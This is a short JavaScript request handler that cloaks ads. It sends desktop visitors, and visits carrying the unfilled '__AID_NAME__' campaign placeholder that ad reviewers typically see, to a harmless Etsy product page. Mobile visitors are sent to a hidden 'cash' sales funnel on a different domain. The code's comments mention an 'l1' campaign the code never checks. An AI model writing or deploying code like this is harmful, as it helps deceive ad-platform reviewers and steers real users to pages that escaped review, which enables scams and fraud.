export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.etsy.com/uk/listing/4330052930/fair-trade-linen-house-slippers-unisex?ls=a&ga_order=most_relevant&ga_search_type=all&ga_view_type=gallery&ga_search_query=cheap+shoes&ref=sc_gallery-1-4&pro=1&plkey=d331d77eb0674874bd78cfa5e6c6b2771b2630b3%3A4330052930";
    const blackPageURL = "https://gymboreeusk.myfunnelish.com/cash-1735686017557538-1759052013535697";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }










